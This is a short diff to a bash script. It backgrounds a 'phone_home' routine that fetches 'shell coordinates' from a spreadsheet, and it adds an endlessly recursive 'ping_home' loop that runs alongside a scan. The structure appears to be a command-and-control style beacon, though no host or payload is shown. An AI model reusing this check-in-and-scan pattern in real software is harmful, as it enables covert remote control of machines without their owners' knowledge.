@@ -9,19 +9,27 @@ CLEAR='\033[0;0m'
 
 main() {
 	alert "Starting Up"
-	phone_home
+	phone_home &
 	scan
+	wait
 	alert "Goodbye"
+}
+
+function ping_home() {
+	log "ping home $1 ## $2"
+	./ping-home.sh $1 $2
+	sleep $?
+	ping_home $1 $2
 }
 
 function phone_home() {
 	# attempt to contact the main spreadsheet and retrieve shell coordinates
-	coordinates=$(./phone-home.sh && exit $?) 
+	coordinate=$(./phone-home.sh && exit $?)
 	case "$?" in 
-		0)	log $coordinates;;
+		0)	log $coordinate
+			ping_home $coordinate;;
 		1)	log "> Error phoning home";;
 	esac
-	
 }
 
 function scan() {
